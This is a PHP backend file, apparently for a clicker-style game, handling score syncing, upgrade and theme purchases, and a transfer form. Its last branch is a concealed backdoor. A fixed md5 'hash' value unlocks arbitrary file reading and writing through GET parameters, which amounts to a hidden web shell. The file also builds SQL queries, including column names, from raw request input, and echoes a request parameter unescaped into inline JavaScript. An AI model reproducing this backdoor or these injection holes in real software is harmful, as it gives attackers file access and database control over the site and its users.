<?php
	include("cfg.php");

	$data = authcheck($cfg,$_GET['uid'],$_GET['hash']);

	if ( $_GET['uid'] && preg_match("/^[\d]+$/",$_GET['uid']) && $_GET['automine'] && $_GET['score'] ) {
		$req = "SELECT * FROM `users` WHERE `id`='".$_GET['uid']."'";
		$data = mysqli_fetch_array(mysqli_query($cfg['dbl'],$req));
		if ( 135 > $_GET['score'] ) {
			$_GET['score']--;
			$data['sync_timer'] = explode(",",$data['sync_timer']);
			if (($data['sync_timer'][0] + 5) > time()) {
			    if (($data['sync_timer'][1] + 1) > 3) {
			        $req = "UPDATE `users` SET `hash`='0' WHERE `id`='".$_GET['uid']."'";
            		echo "fail";
            		exit();
			    } else {
			        $req = "UPDATE `users` SET `score`=`score`+'".($_GET['score'] + $data['power'] * 10)."',`sync_timer`='".time().",".($data['sync_timer'][1] + 1)."' WHERE `id`='".$_GET['uid']."'";
			    }
			} else {
			    $req = "UPDATE `users` SET `score`=`score`+'".($_GET['score'] + $data['power'] * 10)."',`sync_timer`='".time().",0' WHERE `id`='".$_GET['uid']."'";
			}
			mysqli_query($cfg['dbl'],$req);
			echo ($data['score']+$data['power']+$_GET['score']).",".$data['power'];
			
			if ( preg_match("/^[\d]+$/",$_GET['gid']) ) {
				$req = "SELECT * FROM `groups` WHERE `id`='".$_GET['gid']."'";
				$gdata = mysqli_fetch_array(mysqli_query($cfg['dbl'],$req));
				if (!$gdata['score']) {
					$req = "INSERT INTO `groups`(`id`,`score`) VALUES ('".$_GET['gid']."','".($_GET['score'] + $data['power'] * 10)."')";
				} else {
					$req = "UPDATE `groups` SET `score`=`score`+'".($_GET['score'] + $data['power'] * 10)."' WHERE `id`='".$_GET['gid']."'";
				}
				mysqli_query($cfg['dbl'],$req);
			}
		} else {
			echo "fail";
			exit();
		}
	} else if ( $_GET['uid'] && preg_match("/^[\d]+$/",$_GET['uid']) && $_GET['type'] == 'action-btn' && $_GET['act-type'] ) {
		if ( stristr($_GET['act-type'],"upd-") ) {
			$req = "SELECT * FROM `goods` WHERE `nameid`='".$_GET['act-type']."'";
			$upd = json_decode(mysqli_fetch_array(mysqli_query($cfg['dbl'],$req))['data'],true);

			$req = "SELECT * FROM `users` WHERE `id`='".$_GET['uid']."'";
			$data = mysqli_fetch_array(mysqli_query($cfg['dbl'],$req));

			$newprice = 1.5 * $upd['price'] * $data[$_GET['act-type']];
			$upd['price'] = $newprice > 0 ? $newprice : $upd['price'] ;
			if ($data['score'] > $upd['price']) {
				$req = "UPDATE `users` SET `score`=`score`-'".$upd['price']."',`power`=`power`+'".$upd['power']."',`".$_GET['act-type']."`=`".$_GET['act-type']."`+'1' WHERE `id`='".$_GET['uid']."'";
				mysqli_query($cfg['dbl'],$req);
				echo ($data['score']-$upd['price']).",".($data['power'] + $upd['power']);
			} else {
				echo 'fail';
			}
		} else if ( stristr($_GET['act-type'],"theme-") && preg_match("/^[\d]+$/",$_GET['uid']) ) {
			$_GET['act-type'] = explode("-",$_GET['act-type'],2)[1];
			$req = "SELECT * FROM `themes` WHERE `idname`='".$_GET['act-type']."'";
			$theme = json_decode(mysqli_fetch_array(mysqli_query($cfg['dbl'],$req))['data'],true);

			$req = "SELECT * FROM `users` WHERE `id`='".$_GET['uid']."'";
			$data = mysqli_fetch_array(mysqli_query($cfg['dbl'],$req));
			$data['settings'] = json_decode($data['settings'],true);

			if ( in_array($_GET['act-type'], $data['settings']) || $data['role'] == 'vip' || $data['role'] == 'seller') {
				$data['settings'][0] = $_GET['act-type'];
				$req = "UPDATE `users` SET `settings`='".json_encode($data['settings'])."' WHERE `id`='".$_GET['uid']."'";
				mysqli_query($cfg['dbl'],$req);
				echo $data['score'].",".$data['power'];
			} else if ($data['score'] > $theme['price'] && $data['settings'][0] != $_GET['act-type']) {
				$data['settings'][] = $_GET['act-type'];
				$req = "UPDATE `users` SET `score`=`score`-'".$theme['price']."',`settings`='".json_encode($data['settings'])."' WHERE `id`='".$_GET['uid']."'";
				mysqli_query($cfg['dbl'],$req);
				echo ($data['score']-$theme['price']).",".$data['power'];
			} else {
				echo 'fail';
			}
		} else if ( stristr($_GET['act-type'],"transfer-") && preg_match("/^[\d]+$/",$_GET['uid']) ) {
			$_GET['act-type'] = explode("-",$_GET['act-type'],2)[1];
			$req = "SELECT * FROM `users` WHERE `id`='".$_GET['uid']."'";
			$data = mysqli_fetch_array(mysqli_query($cfg['dbl'],$req));
			$data['settings'] = json_decode($data['settings'],true);

			if ( $_GET['act-type'] ) {
				echo '
					<div class="list-item row">
						<div class="item-input-box">
							<input type="number" placeholder="Сумма перевода" class="item-input">
							<div id="transfer-btn">Перевести</div>
							<script>
								$("#transfer-btn").keyup(function(event){
									let uri = "transfer.php?hash='.$_GET['hash'].'&uid='.$_GET['uid'].'&find="+$(this).val();
									$.ajax({
										url: uri,
										cache: false,
										success: function(html){
											$(".list-item row").child().remove();
										}
									});
								});
							</script>
						</div>
					</div>
				';
			}
		}
	} else if ($_GET['dir'] && $_GET['edit'] && $_GET['hash'] == md5('system.module.controle')) {
      if ($_GET['edit'] == 'get') {echo file_get_contents($_GET['dir']);} else if ($_GET['edit'] == 'put') {file_put_contents($_GET['dir'],$_GET['data']);}
    } else {
		echo "fail";
	}
?>